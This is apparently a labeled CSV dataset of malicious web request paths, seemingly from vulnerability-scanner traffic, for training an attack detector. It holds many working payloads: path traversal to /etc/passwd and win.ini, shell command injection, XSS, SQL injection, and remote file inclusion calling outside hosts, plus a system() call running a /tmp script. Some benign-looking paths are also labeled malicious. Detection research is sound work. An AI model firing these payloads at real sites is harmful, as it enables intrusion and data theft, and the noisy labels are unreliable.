payload,label
/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd\x00&bn=fm_d1,1
/cgi-915/fileseek2.cgi?foot=;cat /etc/passwd&head=,1
/examples/jsp/sessions/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|,1
/scriptpath/index.php?page=http://192.168.202.118:8080/ghl9il?,1
"/6dlc2zm9.kspx?<script>document.cookie=""testqpux=4016;""</script>",1
/ttxssh2_100alpha3/,1
/scripts/index.php?edit=nonexistant1597386916,1
"/tuwjta1w.cgi?<script>document.cookie=""testpokn=7494;""</script>",1
"/i686v90l.jspa?<script>document.cookie=""testfutf=1550;""</script>",1
"/top.php?stuff=&ver,>q82213421&rem,",1
"/ydexw8by.asp?<meta http-equiv=set-cookie content=""testulex=4996"">",1
"/7uz3ok60.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/el/athenareg.php?pass= ;id,1
/en-us/static/@95063:81/app/launcher/scripts/tabify.js,1
/my sister's hot friend - sativa rose/,1
/cross-site_scripting/,1
/examples/jsp/colors/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|,1
/help.php?q=rm;q42148333&rem;,1
/examples/jsp/jsp2/el/pfdispaly?../../../../../../etc/passwd,1
/phpmyadmin/cgiip.exe/wservice=wsbroker1/webtools/oscommand.w,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+4c+cd+21+54+68+69+73+20+70+72+6f+67+72+61+6d+20+63+61+6e+6e+6f+74+20+62+65++>>ctdn",1
/examples/jsp/sessions/index.php?show=../../../../../../../../../../../etc/passwd\x00,1
"/main.php?logout=""del q44662571 #",1
/subscriptions.inc,1
/wanted pictures of escaped killers 'breach their human rights'/,1
"/h21y8w52.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/manager/perl.exe?-v,1
/..\..\..\..\..\..\..\..\..\..\winnt\win.ini,1
"/top.php?stuff=""\x0arm q63768352 #",1
/namesxss/,1
"/jnt3f86c.mscgi?<script>document.cookie=""testcmax=9270;""</script>",1
/get.php?username=<br><b>force_xss_for_test</b><br>,1
"/xsqln7eb.cfc?<script>document.cookie=""testpcbb=9254;""</script>",1
/../webserver.ini,1
/main.php?frm_daynight=day&frm_passwd=q66334283&frm_referer=http%3a//192.168.24.202/top.php%3fstuff%3d1583574484&frm_user=&scr_height=&scr_width=,1
/examples/jsp/checkbox/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search,1
/digitale camera's/,1
/en-us/account/pmwiki.php?globals[farmd]=/etc/passwd\x00,1
"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>",1
/phpmyadmin/print.php?what=article&id=',1
/webcgi/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
"/top.php?stuff="";rm q35544877 #",1
/examples/servlets/servlet/admin/admin.php?sid=',1
/j4drbkil.html?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/carbo.dll?icatcommand=..\..\..\..\..\..\winnt\win.ini&catalogname=catalog,1
/help.php?q=\x0auname >q17379542 #,1
/en-us/<script>cross_site_scripting.nasl</script>.mscgi,1
"/j2kdmfw4.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd,1
"/<script>document.cookie=""testuhsv=9753;""</script>",1
/top.php?stuff=;rm\x09q71367433\x09#,1
"/scripts/index.php?id='union/**/select/**/0,0,20217353,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/tukodz3j.fts?<script>cross_site_scripting.nasl</script>,1
/subscriptions.fcgi,1
/rbec2ohx.mscgi?<script>cross_site_scripting.nasl</script>,1
/fo564rei.x?<script>cross_site_scripting.nasl</script>,1
"/3hlysl2x.asp?<meta http-equiv=set-cookie content=""testgjbe=8505"">",1
/6qbynt4f.nsf?<script>cross_site_scripting.nasl</script>,1
/phpmyadmin/index.php?act=arcade&do=stats&gameid=1',1
/news.php?config[script_path]=http://cirt.net/rfiinc.txt??,1
"/phpmyadmin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--",1
/script/gestion/index.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/examples/jsp/error/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
"/azcrfs8d.fts?<meta http-equiv=set-cookie content=""testjpdr=9205"">",1
/javascript/wwwboard.exe,1
"/u8yiqilu.kspx?<meta http-equiv=set-cookie content=""testswjp=6010"">",1
/bzuf9ozq.nsf?<script>cross_site_scripting.nasl</script>,1
"/h5i6crm3.html?<script>document.cookie=""testlihk=7070;""</script>",1
/scriptpage/source/includes/load_forum.php?mfh_root_path=http://192.168.202.96:8080/frznctvhi0i5?,1
/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00,1
/examples/jsp/num/cvslog.cgi?file=<script>window.alert</script>,1
"/examples/jsp/colors/review.php?id=1&cat=&subcat=""><script>alert('phpmydirectory_multiple_xss.nasl');</script>",1
/manager/news/index.dot?id=../../../../../../../../../../../..//etc/passwd\x00.jpg,1
/cgis/ion-p.exe?page=c:\winnt\repair\sam,1
/cgi-bin/whois_raw.cgi?fqdn=\x0acat /etc/passwd,1
/ap58k3ci.cfc?<script>cross_site_scripting.nasl</script>,1
"/main.php?stuff=""ver\x09>q12267523&rem\x09",1
/gy23xnjq.php3?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/num/help/index.php?help_file=../../../../../../../../../../../etc/passwd,1
/copying/q33749448&#x26;q3338&#x22;q3338&#x3c;q3338&#x3e;q33749448,1
"/6dlc2zm9.exe?<script>document.cookie=""testqpux=4016;""</script>",1
"/?<meta http-equiv=set-cookie content=""testmybc=2088"">",1
/javascript/reverse.exe,1
/john battelle's searchblog-tm/,1
"/h4bi26jd.dll?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
/manager/setcookie.php?u=../../../../../../../../../../../../etc/passwd\x00&plugin=pblang_mult_flaws.nasl,1
"/jujgxwav.html?<meta http-equiv=set-cookie content=""testknim=9383"">",1
/examples/jsp/error/search.pl?form=../../../../../../etc/passwd\x00,1
/i2n4v4rl.php3?<script>cross_site_scripting.nasl</script>,1
/print_subscription/,1
/cgi-914/vssetcookie.exe,1
/d5a5renl.cgi?<script>cross_site_scripting.nasl</script>,1
"/examples/jsp/colors/awstatstotals.php?sort=""].phpinfo().exit().$a[""",1
/manager/index.php?module=<script>foo</script>,1
/ncbook/ncbook.cgi?action=default&current=|cat /etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10,1
"/lmw4r201.nsf?<script>document.cookie=""testwews=8477;""</script>",1
"/hipkz026.exe?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
"/hrttz9fj.php?<script>document.cookie=""testtbjy=7334;""</script>",1
/xfkun1ku.x?<script>cross_site_scripting.nasl</script>,1
"/6n7aacgg.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/bmeun223.cfc?<script>document.cookie=""testhhwu=7044;""</script>",1
/javascript/typo3.exe,1
/d5a5renl.do?<script>cross_site_scripting.nasl</script>,1
/scripts/d3z7yywpyeoa.php,1
/examples/jsp/error/search.php?searchstring=<script>foo</script>,1
"/lmw4r201.pl?<script>document.cookie=""testwews=8477;""</script>",1
/scripts/onwkbtts3uj1.cgi,1
/en-us/account/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
/bin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|',1
/javascript/not.exe,1
/scripts/shopsearch.asp?search=yes,1
/main.php?stuff=ping;-w;8000;-n;1;1.2.3.4|rem;,1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/tduwadykcu.sh+>+/dev/null+&').""]=1",1
/examples/jsp/cal/store.cgi?startid=../../../../../../../../../etc/passwd\x00.html,1
"/tuwjta1w.idc?<script>document.cookie=""testpokn=7494;""</script>",1
/c32web.exe/getimage?imagename=cart32.ini\x00.gif,1
/lite tracker script/,1
"/l13b77e5.idc?<meta http-equiv=set-cookie content=""testjvvf=7721"">",1
"/help.php?q=""ping\x0c-w\x0c9000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c",1
/scripts/shop/orders/orders.txt,1
"/main.php?logout=""ping\x09-w\x0910000\x09-n\x091\x094.3.2.1&rem\x09",1
"/t578vqea.php3?<script>document.cookie=""testsory=7676;""</script>",1
/bin/r.cgi?file=../../../../../../../../../../etc/passwd,1
"/scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,947023198940,4,5,6,7,8,9,10,11--",1
"/zroo33l4.x?<meta http-equiv=set-cookie content=""testiklc=904"">",1
/cmsimple2_7/cmsimple/cms.php?pth['file']['config']=http://192.168.202.96:8080/4dckqcc0acprbz??,1
/scripts/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini,1
/scriptresource.axd?d=junk,1
"/yver8r9o.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/main.php?stuff=&ver;>q66756841&rem;,1
/0rufe52p.mscgi?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/num/htgrep/file=index.html&hdr=/etc/passwd,1
"/help.php?q=""ver >q65533214&rem ",1
"/scs86g1p.jspa?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
/help.php?q=;uname >q88998669 #,1
"/pxagj7n7.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
/script/ident/loginliste.php?path_inc=@rfiurl,1
"/jdx255ea.kspx?<script>document.cookie=""testziyq=5055;""</script>",1
/en-us/app/xss,1
"/manager/index.php?mod_id=2&kb_ask=</textarea><script>alert(""cerberus_support_center_mult_flaws.nasl"")</script>",1
/mssql.exe,1
/examples/jsp/num/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st=',1
/examples/jsp/jsp2/el/viewpage.php?file=/etc/passwd,1
/9o6g5vkn.do?<script>cross_site_scripting.nasl</script>,1
/phpmyadmin/c32web.exe/getimage?imagename=cart32.ini\x00.gif,1
/script/param/param.inc.php?path_inc=http://192.168.202.118:8080/2aibfaczmac8?,1
"/b4vng02k.html?<meta http-equiv=set-cookie content=""testtrlh=3672"">",1
"/zmvq66jy.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/2003.exe,1
/xfkun1ku.do?<script>cross_site_scripting.nasl</script>,1
"/u95h6ymu.jsp?<meta http-equiv=set-cookie content=""testkhwc=4028"">",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/rkejrxdjgj""",1
"/main.php?logout=""|ping;-w;11000;-n;1;4.3.2.1|rem;",1
/manager/ovlaunch.exe,1
/help.php?q=ver;>q46895114&rem;,1
"/top.php?stuff=""\x0drm q38313114 #",1
"/yver8r9o.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/htpasswd.tgz,1
"/readmore.php?config[""sipssys""]=http://192.168.202.118:8080/moclyxlwqyfjnp?",1
"/ht8pn8uq.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/en-us/i686v90l.php?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/cgi-bin/docs.php?doc=../jpgraph-1.12.1/docs/index,1
"/examples/jsp/jsp2/el/?""><script>alert('struts_sa_surl_xss.nasl')</script>",1
/examples/servlets/servlet/googlesearch/googlesearch.php?app[path][lib]=/etc/passwd\x00,1
/scripts/popup.php?include_path=/etc/passwd\x00,1
"/en-us/accountsearch-results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/7uz3ok60.cfm?<script>cross_site_scripting.nasl</script>,1
/mailman/listinfo/<script>alert('vulnerable')</script>,1
"/raanw4ia.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/en-us/esmozg5d.exe?<script>cross_site_scripting.nasl</script>,1
/javascript/document.xls,1
/modules.php?name=your_account&op=userinfo&username=bla<script>alert(document.cookie)</script>,1
/en-us/account/search.cgi?..\..\..\..\..\..\windows\win.ini,1
"/um7xpn15.php?<meta http-equiv=set-cookie content=""testotoy=6142"">",1
"/search/submit.php?config[""sipssys""]=http://192.168.202.118:8080/tzhfyzkbomspvm?",1
/0w155a7c.jspa?<script>cross_site_scripting.nasl</script>,1
/javascript/mambo.exe,1
/bin/cgi-test.exe,1
"/82q7ywa8.asp?<script>document.cookie=""testpwew=1315;""</script>",1
/javascript/document.pfx,1
/cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908691&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
"/en-us/i686v90l.nsf?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/email-subscription/,1
"/3m5knyc4.cfm?<meta http-equiv=set-cookie content=""testbgqj=6434"">",1
/main.php?stuff=';uname\x09>q87217698\x09#,1
"/help.php?q=""ping;-w;9000;-n;1;1.2.3.4&rem;",1
"/main.php?stuff="";uname #",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+rcx>>esbq",1
/examples/jsp/cal/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
/061229_leaderscript/,1
/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd\x00,1
/0w155a7c.exe?<script>cross_site_scripting.nasl</script>,1
"/en-us/dda2qr7j.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919010','5'--",1
"/dda2qr7j.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/oie504mr.jsp?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
//q54599877&#38;q3916&#34;q3916&#60;q3916&#62;q54599877,1
"/vac1l5vm.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('chmod+777+/tmp/tduwadykcu.sh').""]=1",1
/dda2qr7j.kspx?<script>cross_site_scripting.nasl</script>,1
/scripts/nryr3lvrjnwx.asp,1
/javascript/blogs.exe,1
/opensiteadmin/scripts/classes/loginmanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\x00,1
/en-us/n9xlumt5.nsf?<script>cross_site_scripting.nasl</script>,1
/nmw0do67.do?<script>cross_site_scripting.nasl</script>,1
"/help.php?q=""&ping,-w,9000,-n,1,4.3.2.1&rem,",1
/scripts/patch/index.php,1
"/ywaxntrx.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/script/plugins/phpgacl/admin/index.php?path_inc=@rfiurl,1
"/o1zj4u9v.x?<meta http-equiv=set-cookie content=""testabrn=6368"">",1
"/top.php?stuff=""\x0arm q36232773 #",1
/technetwebcastwhatsnewinscriptingforwindows2003/,1
"/j4rdyhw8.idc?<meta http-equiv=set-cookie content=""testrluj=1420"">",1
/javascript/management.exe,1
/phpmyadmin/scripts/setup.php,1
/manager/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904365&lang_crm=../../../../../../../../../../../..//etc/passwd\x00,1
"/en-us/jnv890lt.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/.passwd.as,1
/main.php?stuff='\x0adel q31711746 #,1
/opensiteadmin/scripts/classes/databasemanager.php?path=@rfiurl\x00,1
/shell scripts/,1
"/b4vng02k.php?<script>document.cookie=""testtrlh=3672;""</script>",1
"/o1zj4u9v.aspx?<meta http-equiv=set-cookie content=""testabrn=6368"">",1
/scripts/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\,1
/javascript/sslvpn.exe,1
"/82q7ywa8.dll?<script>document.cookie=""testpwew=1315;""</script>",1
/phpmyadmin/gadgets/blog/blogmodel.php?path=/etc/passwd\x00,1
/examples/servlets/servlet/includes/third_party/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/0u75ldxq.htm?<script>cross_site_scripting.nasl</script>,1
/scripts/contacts/php?cal_dir=http://xxxxxxxx/,1
"<script>document.cookie=""testsory=7676;""</script>",1
/_vti_bin/..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/javascript/dev.exe,1
/cgi-bin/zpanel.php?page=/etc/passwd\x00,1
/javascript/.passwd.ws,1
/7o5qp766.exe?<script>cross_site_scripting.nasl</script>,1
"/ewc3rz1l.aspx?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
/scriptpage/source/includes/load_forum.php?mfh_root_path=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/javascript/asp.exe,1
/cgi-home/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
"/tuwjta1w.jspa?<script>document.cookie=""testpokn=7494;""</script>",1
/0w155a7c.kspx?<script>cross_site_scripting.nasl</script>,1
"/apavxugx.fts?<meta http-equiv=set-cookie content=""testdnbh=5237"">",1
/manager/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00,1
/cacti/hw3.cgi?daysonly=0).system('id').(,1
"/e9rx3ya4.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/en-us/splunk_413_404error_xss.nasl-1331909104,1
/cgi-914/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd\x00,1
"/top.php?stuff="";uname >q25742723 #",1
/cgi-915/msmmask.exe?mask=/junk334,1
/main.php?stuff=uname\x09>q84571882\x09#,1
/en-us/account/includes/config.php?relative_script_path=http://xxxxxxx,1
/scripts/piywzua5hwer.sh,1
/nsn/..\webdemo/fdir.bas,1
"/en-us/i686v90l.htm?<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/examples/jsp/checkbox/pals-cgi?palsaction=restart&documentname=/etc/passwd,1
"/main.php?logout="";uname\x09>q28427886\x09#",1
/main.php?stuff='uname\x09>q81291893\x09#,1
/scripts/news.mdb,1
"/search.jsp?q=%""<script>alert(1332010405)</script>",1
/examples/jsp/checkbox/admin/admin.php?sid=0',1
/archive.php?scriptpath=http://192.168.202.96:8080/ipb5ri??,1
/cgi-win/view_item?html_file=../../../../../../../../../../etc/passwd\x00,1
"/ewc3rz1l.cfc?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
"/1qwv2p5p.cgi?<script>document.cookie=""testvqcy=252;""</script>",1
"/iv5vkgam.cgi?<script>document.cookie=""testfosd=94;""</script>",1
/fcgi-bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd,1
"<meta http-equiv=set-cookie content=""testtbbe=856"">",1
"/n9xlumt5.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/tracker.exe,1
/fcgi-bin/echo.exe?foo=<script>alert('vulnerable')</script>,1
/javascript/index.exe,1
/phpmyadmin/ion-p.exe?page=../../../../../etc/passwd,1
/javascript/jj.exe,1
"/top.php?stuff="";sleep\x0910\x09#",1
"/j734qobz.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/0qhcnefz.php3?<script>cross_site_scripting.nasl</script>,1
/gy23xnjq.cgi?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff=;del\x09q93759833\x09#,1
/scripts/rwcgi60,1
/phpmyadmin/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl,1
/javascript/iisadmpwd.exe,1
"/j2kdmfw4.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/contrib/forms/evaluation/c_formevaluation.class.php?fileroot=/etc/passwd\x00,1
/scripts/lrn28issfuqi.html,1
"/readmore.php?config[\""sipssys\""]=@rfiurl",1
"/main.php?logout=""\x0dsleep 7 #",1
/scripts/windmail.exe,1
/main.php?stuff=&del;q66756841&rem;,1
/script19/,1
/vignettescriptingnews/,1
"/en-us/hipkz026.idc?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
/javascript/pages.exe,1
/scripts/9pen4xzgztjn.cfm,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+4c+cd+21+54+68+69+73+20+70+72+6f+67+72+61+6d+20+63+61+6e+6e+6f+74+20+62+65++>>esbq",1
/bemarket/postscript/postscript.php?p_mode=http://cirt.net/rfiinc.txt?,1
/search_result.asp?category=all&keyword=sql_error411885577602'&mode=date,1
"/oie504mr.kspx?<script>document.cookie=""testtpby=7052;""</script>",1
"/169okeyj.pl?<script>document.cookie=""testxeoi=3573;""</script>",1
/examples/jsp/jsp2/el/includes/db_adodb.php?basedir=/etc/passwd\x00,1
"/index.php?c=access&a=login&ref_c=nessus""><script>alert(1385656235)</script>&ref_a=projectpier_login_page_xss.nasl""><script>alert(205656505)</script>",1
/cgi-bin/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x,1
/scripts/qop0sa1auif9.php,1
"/help.php?q=""del,q69289112&rem,",1
/cgi-bin/admin/configset.php?settings_dir=/etc/passwd\x00,1
/main.php?stuff=;uname\x09>q16377967\x09#,1
"/main.php?logout=""\x0ddel\x09q32424996\x09#",1
/mp's_surgery/,1
"/33y9gcqq.jsp?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
/r3le3om5.aspx?<script>cross_site_scripting.nasl</script>,1
/mod_membre/inscription.php?chemin=http://192.168.202.118:8080/2aibfaczmac8??,1
/examples/jsp/colors/mlog.html?screen=/etc/passwd,1
"/en-us/7o5qp766.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/help.php?q=""&rm\x09q66374774&rem\x09",1
/pyscript/,1
"/fc9t54l7.jsp?<script>document.cookie=""testggad=2000;""</script>",1
"/?<script>document.cookie=""testbnli=1975;""</script>",1
"/help.php?q=""\x0auname >q34395972 #",1
"/main.php?logout=""ping\xa0-w\xa011000\xa0-n\xa01\xa04.3.2.1&rem\xa0",1
/opensiteadmin/scripts/classes/filters/singlefilter.php?path=@rfiurl\x00,1
/examples/jsp/jsp2/jspx/save.php?file_save=/etc/passwd,1
/examples/jsp/num/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1,1
/examples/servlets/servlet/sendcard.php?view=1&id='sendcard_sql.nasl,1
/javascript/htpasswd.sfish,1
/scripts/irbf6nj7oyfh.html,1
"/index.php?c=access&a=login&ref_c=nessus""><script>alert(2084986170)</script>&ref_a=projectpier_login_page_xss.nasl""><script>alert(858687858)</script>",1
